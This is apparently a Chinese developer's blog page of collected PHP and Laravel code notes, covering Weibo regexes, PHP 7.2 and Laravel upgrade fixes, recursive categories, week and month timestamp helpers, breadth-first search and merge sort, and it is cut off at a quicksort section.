public <span class="function"><span class="keyword">function</span> <span class="title">between</span>(<span class="params">$startDate, $endDate, SalesOutputInterface $formater</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $sales = $<span class="keyword">this</span>-&gt;repo-&gt;between($startDate, $endDate);</span><br><span class="line">        $formater-&gt;output($sales);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/27953</span></span><br></pre></td></tr></table></figure>
<h3 id="与微博内容分析相关的正则表达式"><a href="#与微博内容分析相关的正则表达式" class="headerlink" title="与微博内容分析相关的正则表达式"></a>与微博内容分析相关的正则表达式</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">微博表情\[[\u4e00-\u9fa5A-Za-z]&#123;<span class="number">1</span>,<span class="number">8</span>&#125;\]</span><br><span class="line">微博昵称@[\u4e00-\u9fa5A-Z0<span class="number">-9</span>a-z_-]&#123;<span class="number">2</span>,<span class="number">30</span>&#125;</span><br><span class="line">微博话题#[^@&lt;&gt;#"&amp;'\r\n\t]&#123;1,49&#125;#</span><br><span class="line">微博短链接#https&#123;0,1&#125;://t.cn/[A-Z0-9a-z]&#123;6,8&#125;[/]&#123;0,1&#125;#</span><br><span class="line">网址长链接(https?|ftp|file):<span class="comment">//[-A-Za-z0-9+&amp;@#/%?=~_|!:,.;]+[-A-Za-z0-9+&amp;@#/%=~_|]</span></span><br><span class="line">https:<span class="comment">//www.playpi.org/2018121101.html</span></span><br></pre></td></tr></table></figure>
<h3 id="Warning-count-Parameter-must-be-an-array-or-an-object"><a href="#Warning-count-Parameter-must-be-an-array-or-an-object" class="headerlink" title="Warning: count(): Parameter must be an array or an object"></a>Warning: count(): Parameter must be an array or an object</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PHP7<span class="number">.2</span>中这样写https:<span class="comment">//segmentfault.com/a/1190000017268206</span></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo count(<span class="literal">null</span>);</span><br><span class="line">会报以下错误：</span><br><span class="line"></span><br><span class="line">Warning: count(): Parameter must be an array or an object that implements Countable <span class="keyword">in</span> </span><br><span class="line">但在PHP7<span class="number">.1</span>以下</span><br><span class="line">会返回<span class="number">0</span></span><br><span class="line">所以这次就坑了自己最终又从PHP7<span class="number">.2</span>降回<span class="number">7.1</span> php artisan -V 查看Laravel版本</span><br><span class="line"></span><br><span class="line">laravel <span class="number">5.4</span>和<span class="number">5.6</span>的日志是有区别的</span><br><span class="line">所以需要在config下添加一个logging.php的配置文件，代码请复制里面</span><br><span class="line">https:<span class="comment">//github.com/laravel/laravel/blob/develop/config/logging.php</span></span><br><span class="line">http:<span class="comment">//wangyapeng.me/2019/01/13/upgrad-laravel-5.5-to-5.7-log/ </span></span><br><span class="line">然后在.env下添加LOG_CHANNEL=stack这样日志就不会报错了</span><br><span class="line">在 .env 删除 APP_DEBUG_LEVEL，新增 LOG_CHANNEL=stack</span><br><span class="line">在 config/app.php 内删除 log 和 log_level 两个字段</span><br></pre></td></tr></table></figure>
<h3 id="无限级分类"><a href="#无限级分类" class="headerlink" title="无限级分类"></a>无限级分类</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">php artisan make:migration create_category_table --create=category</span><br><span class="line"><span class="comment">//https://segmentfault.com/a/1190000010359094</span></span><br><span class="line">Schema::create(<span class="string">'categorys'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">Blueprint $table</span>) </span>&#123;</span><br><span class="line">            $table-&gt;increments(<span class="string">'id'</span>);</span><br><span class="line">            $table-&gt;integer(<span class="string">'parent_id'</span>);</span><br><span class="line">            $table-&gt;string(<span class="string">'code'</span>);</span><br><span class="line">            $table-&gt;string(<span class="string">'name'</span>);</span><br><span class="line">            $table-&gt;string(<span class="string">'path'</span>);</span><br><span class="line">            $table-&gt;timestamps();</span><br><span class="line">        &#125;);</span><br><span class="line">php artisan migrate</span><br><span class="line"></span><br><span class="line">php artisan make: model Category -m</span><br><span class="line">use Illuminate\Database\Eloquent\Model;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Category</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">childCategory</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;hasMany(<span class="string">'App\Category'</span>, <span class="string">'parent_id'</span>, <span class="string">'id'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">allChildrenCategorys</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;childCategory()-&gt;<span class="keyword">with</span>(<span class="string">'allChildrenCategorys'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$categorys = App/Category::<span class="keyword">with</span>(<span class="string">'allChildrenCategorys'</span>)-&gt;first();</span><br><span class="line">$categorys-&gt;allChildrenCategorys; </span><br><span class="line">$categorys-&gt;allChildrenCategorys-&gt;first()-&gt;allChildrenCategorys;</span><br><span class="line"> $arr = [];</span><br><span class="line">    array_walk_recursive($categories,<span class="function"><span class="keyword">function</span> (<span class="params">$v, $k</span>) <span class="title">use</span>(<span class="params">&amp;$arr</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($k == <span class="string">'id'</span>)</span><br><span class="line">            $arr[] = $v;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
<h3 id="本周一的时间戳"><a href="#本周一的时间戳" class="headerlink" title="本周一的时间戳"></a>本周一的时间戳</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">strtotime(<span class="string">'monday'</span>);</span><br><span class="line">因为这样会导致在非周一的时候计算到下一个周一，</span><br><span class="line">https:<span class="comment">//www.h57.pw/2018/11/27/calculate-the-timestamp-of-this-monday/</span></span><br><span class="line">所以我们要在计算之前先判定一下当前是周几，如果是周一就采用 <span class="string">'monday'</span> 非周一的时候采用<span class="string">'previous monday'</span></span><br><span class="line"><span class="keyword">if</span>(date(<span class="string">'w'</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">    $time = strtotime(<span class="string">'monday'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $time = strtotime(<span class="string">'previous monday'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">老外认为“<span class="keyword">this</span> monday”是下周一，“last monday”是本周一</span><br><span class="line">直接<span class="string">"-2 monday"</span>就好了，或者<span class="string">"monday last week"</span></span><br><span class="line">date(<span class="string">'w'</span>)得到当前周几,由于周一至周六分别是<span class="number">1</span><span class="number">-6</span>，周日是<span class="number">0</span>。当值为<span class="number">0</span>的时候，上周一是<span class="number">13</span>天前。其余就是date(<span class="string">'w'</span>)+<span class="number">6</span>天前。</span><br><span class="line"></span><br><span class="line">$days = date(<span class="string">'w'</span>)==<span class="number">0</span>?<span class="number">13</span>:date(<span class="string">'w'</span>)+<span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">echo date(<span class="string">'Y-m-d'</span>,time()-$days*<span class="number">86400</span>);</span><br><span class="line">&gt;&gt;&gt; date(<span class="string">'Ymd His'</span>,strtotime(<span class="string">'-1 monday'</span>))</span><br><span class="line">=&gt; <span class="string">"20190429 000000"</span></span><br><span class="line">&gt;&gt;&gt; date(<span class="string">'Ymd His'</span>,strtotime(<span class="string">'-1 monday 2019-05-06'</span>))</span><br><span class="line">=&gt; <span class="string">"20190429 000000"</span></span><br><span class="line">&gt;&gt;&gt; date(<span class="string">'Ymd His'</span>,strtotime(<span class="string">' monday 2019-05-06'</span>))</span><br><span class="line">=&gt; <span class="string">"20190506 000000"</span></span><br><span class="line">echo <span class="string">'&lt;br&gt;上周:&lt;br&gt;'</span>;</span><br><span class="line">echo date(<span class="string">"Y-m-d H:i:s"</span>,mktime(<span class="number">0</span>, <span class="number">0</span> , <span class="number">0</span>,date(<span class="string">"m"</span>),date(<span class="string">"d"</span>)-date(<span class="string">"w"</span>)+<span class="number">1</span><span class="number">-7</span>,date(<span class="string">"Y"</span>))),<span class="string">"\n"</span>;</span><br><span class="line">echo date(<span class="string">"Y-m-d H:i:s"</span>,mktime(<span class="number">23</span>,<span class="number">59</span>,<span class="number">59</span>,date(<span class="string">"m"</span>),date(<span class="string">"d"</span>)-date(<span class="string">"w"</span>)+<span class="number">7</span><span class="number">-7</span>,date(<span class="string">"Y"</span>))),<span class="string">"\n"</span>;</span><br><span class="line">echo <span class="string">'&lt;br&gt;本周:&lt;br&gt;'</span>;</span><br><span class="line">echo date(<span class="string">"Y-m-d H:i:s"</span>,mktime(<span class="number">0</span>, <span class="number">0</span> , <span class="number">0</span>,date(<span class="string">"m"</span>),date(<span class="string">"d"</span>)-date(<span class="string">"w"</span>)+<span class="number">1</span>,date(<span class="string">"Y"</span>))),<span class="string">"\n"</span>;</span><br><span class="line">echo date(<span class="string">"Y-m-d H:i:s"</span>,mktime(<span class="number">23</span>,<span class="number">59</span>,<span class="number">59</span>,date(<span class="string">"m"</span>),date(<span class="string">"d"</span>)-date(<span class="string">"w"</span>)+<span class="number">7</span>,date(<span class="string">"Y"</span>))),<span class="string">"\n"</span>;</span><br><span class="line"> </span><br><span class="line">echo <span class="string">'&lt;br&gt;上月:&lt;br&gt;'</span>;</span><br><span class="line">echo date(<span class="string">"Y-m-d H:i:s"</span>,mktime(<span class="number">0</span>, <span class="number">0</span> , <span class="number">0</span>,date(<span class="string">"m"</span>)<span class="number">-1</span>,<span class="number">1</span>,date(<span class="string">"Y"</span>))),<span class="string">"\n"</span>;</span><br><span class="line">echo date(<span class="string">"Y-m-d H:i:s"</span>,mktime(<span class="number">23</span>,<span class="number">59</span>,<span class="number">59</span>,date(<span class="string">"m"</span>) ,<span class="number">0</span>,date(<span class="string">"Y"</span>))),<span class="string">"\n"</span>;</span><br><span class="line">echo <span class="string">'&lt;br&gt;本月:&lt;br&gt;'</span>;</span><br><span class="line">echo date(<span class="string">"Y-m-d H:i:s"</span>,mktime(<span class="number">0</span>, <span class="number">0</span> , <span class="number">0</span>,date(<span class="string">"m"</span>),<span class="number">1</span>,date(<span class="string">"Y"</span>))),<span class="string">"\n"</span>;</span><br><span class="line">echo date(<span class="string">"Y-m-d H:i:s"</span>,mktime(<span class="number">23</span>,<span class="number">59</span>,<span class="number">59</span>,date(<span class="string">"m"</span>),date(<span class="string">"t"</span>),date(<span class="string">"Y"</span>))),<span class="string">"\n"</span>;</span><br><span class="line"> </span><br><span class="line">$getMonthDays = date(<span class="string">"t"</span>,mktime(<span class="number">0</span>, <span class="number">0</span> , <span class="number">0</span>,date(<span class="string">'n'</span>)+(date(<span class="string">'n'</span>)<span class="number">-1</span>)%<span class="number">3</span>,<span class="number">1</span>,date(<span class="string">"Y"</span>)));<span class="comment">//本季度未最后一月天数</span></span><br><span class="line">echo <span class="string">'&lt;br&gt;本季度:&lt;br&gt;'</span>;</span><br><span class="line">echo date(<span class="string">'Y-m-d H:i:s'</span>, mktime(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,date(<span class="string">'n'</span>)-(date(<span class="string">'n'</span>)<span class="number">-1</span>)%<span class="number">3</span>,<span class="number">1</span>,date(<span class="string">'Y'</span>))),<span class="string">"\n"</span>;</span><br><span class="line">echo date(<span class="string">'Y-m-d H:i:s'</span>, mktime(<span class="number">23</span>,<span class="number">59</span>,<span class="number">59</span>,date(<span class="string">'n'</span>)+(date(<span class="string">'n'</span>)<span class="number">-1</span>)%<span class="number">3</span>,$getMonthDays,date(<span class="string">'Y'</span>))),<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 获取指定年月的开始和结束时间戳</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param int $year 年份</span></span><br><span class="line"><span class="comment"> * @param int $month 月份</span></span><br><span class="line"><span class="comment"> * @return array(开始时间,结束时间)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMonthBeginAndEnd</span>(<span class="params">$year = <span class="number">0</span>, $month = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    $year = $year ? $year : date(<span class="string">'Y'</span>);</span><br><span class="line">    $month = $month ? $month : date(<span class="string">'m'</span>);</span><br><span class="line">    $d = date(<span class="string">'t'</span>, strtotime($year . <span class="string">'-'</span> . $month));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [<span class="string">'begin'</span> =&gt; strtotime($year . <span class="string">'-'</span> . $month), <span class="string">'end'</span> =&gt; mktime(<span class="number">23</span>, <span class="number">59</span>, <span class="number">59</span>, $month, $d, $year)];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取指定时间戳所在的月份的开始时间戳和结束时间戳</span></span><br><span class="line"><span class="comment"> *http://www.phpernote.com/php-function/1439.html</span></span><br><span class="line"><span class="comment"> * @param int $timestamp</span></span><br><span class="line"><span class="comment"> * @return array(开始时间,结束时间)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMonthBeginAndEnd</span>(<span class="params">$timestamp = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    $timestamp = $timestamp ? $timestamp : time();</span><br><span class="line"></span><br><span class="line">    $year = date(<span class="string">'Y'</span>, $timestamp);</span><br><span class="line">    $month = date(<span class="string">'m'</span>, $timestamp);</span><br><span class="line">    $d = date(<span class="string">'t'</span>, strtotime($year . <span class="string">'-'</span> . $month));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [<span class="string">'begin'</span> =&gt; strtotime($year . <span class="string">'-'</span> . $month), <span class="string">'end'</span> =&gt; mktime(<span class="number">23</span>, <span class="number">59</span>, <span class="number">59</span>, $month, $d, $year)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="广度优先搜索"><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 广度搜索</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 你的朋友关系，以及朋友的朋友的关系，查看你的朋友或者朋友的朋友是不是包含 m 结尾的名字</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要检索的数组</span></span><br><span class="line">$graph = [];</span><br><span class="line">$graph[<span class="string">'you'</span>] = [<span class="string">'alice'</span>, <span class="string">'bob'</span>, <span class="string">'claire'</span>];</span><br><span class="line">$graph[<span class="string">'bob'</span>] = [<span class="string">'anuj'</span>, <span class="string">'peggy'</span>];</span><br><span class="line">$graph[<span class="string">'alice'</span>] = [<span class="string">'peggy'</span>];</span><br><span class="line">$graph[<span class="string">'claire'</span>] = [<span class="string">'thom'</span>, <span class="string">'jonny'</span>];</span><br><span class="line">$graph[<span class="string">'anuj'</span>] = [];</span><br><span class="line">$graph[<span class="string">'peggy'</span>] = [];</span><br><span class="line">$graph[<span class="string">'thom'</span>] = [];</span><br><span class="line">$graph[<span class="string">'jonny'</span>] = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 搜索过的数组</span></span><br><span class="line">$searchedItem = [];</span><br><span class="line"><span class="comment">// 待检索的数组</span></span><br><span class="line">$waitSearchArray = [];</span><br><span class="line"><span class="comment">// 将第一层的关系加入到等待搜索的数组</span></span><br><span class="line">$waitSearchArray = array_merge($waitSearchArray, $graph[<span class="string">'you'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将结果元素赋值为 false</span></span><br><span class="line">$resultName = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//需要查找的字符</span></span><br><span class="line">$findChar = <span class="string">'z'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果等待搜索的数组不为空就循环查找</span></span><br><span class="line"><span class="keyword">while</span> ($waitSearchArray) &#123;</span><br><span class="line">    <span class="comment">// 从队列头部弹出一个元素</span></span><br><span class="line">    $name = array_shift($waitSearchArray);</span><br><span class="line">    <span class="comment">// 如果待检查的元素在已经搜索过的数组中，就跳过，这个是用来防止循环检查的</span></span><br><span class="line">    <span class="keyword">if</span> (in_array($name, $searchedItem)) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取最后一个字符</span></span><br><span class="line">    $lastChar = substr($name, strlen($name) - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 如果最后一个字符是 m，就说明找到了，把结果赋值，然后跳出循环</span></span><br><span class="line">    <span class="keyword">if</span> ($lastChar == $findChar) &#123;</span><br><span class="line">        $resultName = $name;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 到这里了说明没有找到，那么把这个人的名字，放入到已经搜索过的数组中</span></span><br><span class="line">    $searchedItem[] = $name;</span><br><span class="line">    <span class="comment">// 然后再把这个名字的朋友关系加入到待搜索的数组中</span></span><br><span class="line">    $waitSearchArray = array_merge($waitSearchArray, $graph[$name]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//www.h57.pw/2017/11/14/breadthfirst-search-php-implementation/</span></span><br><span class="line">var_dump($resultName);</span><br></pre></td></tr></table></figure>
<h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sortArr</span>(<span class="params">$arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (count($arr) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $arr;</span><br><span class="line">    &#125;</span><br><span class="line">    $mid = count($arr) / <span class="number">2</span>;</span><br><span class="line">    $arr1 = array_slice($arr, <span class="number">0</span>, $mid);</span><br><span class="line">    $arr2 = array_slice($arr, $mid, count($arr));</span><br><span class="line">    $arr1 = sortArr($arr1);</span><br><span class="line">    $arr2 = sortArr($arr2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mergeArr($arr1, $arr2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeArr</span>(<span class="params">$arr1, $arr2</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!is_array($arr1)) &#123;</span><br><span class="line">        $arr1[] = $arr1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!is_array($arr2)) &#123;</span><br><span class="line">        $arr2[] = $arr2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $i =<span class="number">0</span>;</span><br><span class="line">    $j = <span class="number">0</span>;</span><br><span class="line">    $arr1Length = count($arr1);</span><br><span class="line">    $arr2Length = count($arr2);</span><br><span class="line">    $returnArr = [];</span><br><span class="line">    <span class="keyword">while</span>($i &lt; $arr1Length &amp;&amp; $j &lt; $arr2Length) &#123;</span><br><span class="line">        <span class="keyword">if</span>($arr1[$i] &gt; $arr2[$j]) &#123;</span><br><span class="line">            $returnArr[] = $arr2[$j];</span><br><span class="line">            $j++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $returnArr[] = $arr1[$i];</span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>($tmp = $i; $tmp &lt; $arr1Length; $tmp++) &#123;</span><br><span class="line">        $returnArr[] = $arr1[$tmp];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>($tmp = $j; $tmp &lt; $arr2Length; $tmp++) &#123;</span><br><span class="line">        $returnArr[] = $arr2[$tmp];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $returnArr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$arr = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sortableArr = sortArr($arr);</span><br><span class="line"><span class="comment">//https://www.h57.pw/2016/09/25/php-merge-sort/</span></span><br><span class="line">foreach ($sortableArr <span class="keyword">as</span> $a) &#123;</span><br><span class="line">    print_r($a . <span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="正则表达式实现-某人"><a href="#正则表达式实现-某人" class="headerlink" title="正则表达式实现 @某人"></a>正则表达式实现 @某人</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match_all (‘#@\w+#u’, ‘@张全蛋 含泪质检 @三星 Note7 被炸飞，听说 @炸机 跟 @啤酒 更配哦！’, $matches)) &#123;</span><br><span class="line">var_export($matches);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">array (</span><br><span class="line"><span class="number">0</span> =&gt;</span><br><span class="line">array (</span><br><span class="line"><span class="number">0</span> =&gt; ‘@张全蛋’,</span><br><span class="line"><span class="number">1</span> =&gt; ‘@三星 Note7’,</span><br><span class="line"><span class="number">2</span> =&gt; ‘@炸机’,</span><br><span class="line"><span class="number">3</span> =&gt; ‘@啤酒’,</span><br><span class="line">),</span><br><span class="line">)</span><br><span class="line">正则表达式 #@\w+#u 中:</span><br><span class="line">#是分隔符.</span><br><span class="line">u 是修饰符，表示 Unicode.</span><br><span class="line">\w 是元字符，在 ASCII 下等价于 [A-Za-z0<span class="number">-9</span>_], 在 Unicode 下表示字符 (包括汉字) 和数字和下划线.</span><br><span class="line">+ 是量词，表示 <span class="number">1</span> 个或多个，等价于 &#123;<span class="number">1</span>,&#125;</span><br></pre></td></tr></table></figure>
<h3 id="快排和归并排序"><a href="#快排和归并排序" class="headerlink" title="快排和归并排序"></a>快排和归并排序</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 